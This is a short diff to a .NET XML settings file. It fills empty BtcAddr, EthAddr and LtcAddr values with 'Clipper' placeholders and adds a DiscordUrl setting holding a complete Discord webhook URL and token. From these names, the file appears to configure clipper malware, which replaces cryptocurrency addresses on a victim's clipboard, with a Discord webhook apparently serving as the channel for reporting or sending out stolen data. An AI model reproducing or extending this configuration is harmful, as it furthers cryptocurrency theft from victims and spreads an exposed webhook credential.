@@ -63,13 +63,16 @@
       <Value Profile="(Default)">3128</Value>
     </Setting>
     <Setting Name="BtcAddr" Type="System.String" Scope="User">
-      <Value Profile="(Default)" />
+      <Value Profile="(Default)">--- ClipperBTC ---</Value>
     </Setting>
     <Setting Name="EthAddr" Type="System.String" Scope="User">
-      <Value Profile="(Default)" />
+      <Value Profile="(Default)">--- ClipperETH ---</Value>
     </Setting>
     <Setting Name="LtcAddr" Type="System.String" Scope="User">
-      <Value Profile="(Default)" />
+      <Value Profile="(Default)">--- ClipperLTC ---</Value>
+    </Setting>
+    <Setting Name="DiscordUrl" Type="System.String" Scope="User">
+      <Value Profile="(Default)">https://discord.com/api/webhooks/1016614786533969920/fMJOOjA1pZqjV8_s0JC86KN9Fa0FeGPEHaEak8WTADC18s5Xnk3vl2YBdVD37L0qTWnM</Value>
     </Setting>
   </Settings>
 </SettingsFile>
